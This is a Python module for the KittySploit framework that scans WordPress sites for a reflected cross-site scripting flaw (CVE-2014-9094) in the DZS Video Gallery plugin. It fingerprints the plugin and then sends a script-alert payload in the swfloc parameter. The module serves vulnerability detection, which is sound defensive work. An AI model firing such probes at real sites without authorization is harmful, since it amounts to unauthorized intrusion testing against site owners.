#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Multiple cross-site scripting vulnerabilities in deploy/designer/preview."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress DZS-VideoGallery Plugin Cross-Site Scripting Detection',
        'description': 'Multiple cross-site scripting vulnerabilities in deploy/designer/preview.php in the Digital Zoom Studio (DZS) Video Gallery plugin for WordPress allow remote attackers to inject arbitrary web script or HTML via the (1) swfloc or (2) designrand parameter.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve2014', 'cve', 'wordpress', 'xss', 'wp-plugin', 'seclists', 'digitalzoomstudio', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2014-9094',
            'http://websecurity.com.ua/7152/',
            'http://seclists.org/fulldisclosure/2014/Jul/65',
            'https://github.com/ARPSyndicate/kenzer-templates',
            'https://github.com/d4n-sec/d4n-sec.github.io',
        ],
        'cve': 'CVE-2014-9094',
    }

    def run(self):
        path = '/wp-content/plugins/dzs-videogallery/readme'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('Video Gallery WordPress DZS',)
        if not (any(m in body for m in body_any)):
            return False
        path = '/wp-content/plugins/dzs-videogallery/deploy/designer/preview.php?swfloc=%22%3E%3Cscript%3Ealert(1)%3C/script%3E'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('<script>alert(1)</script>',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(severity='medium', reason='WordPress DZS-VideoGallery Plugin Cross-Site Scripting detected', path=path)
            return True
        return False

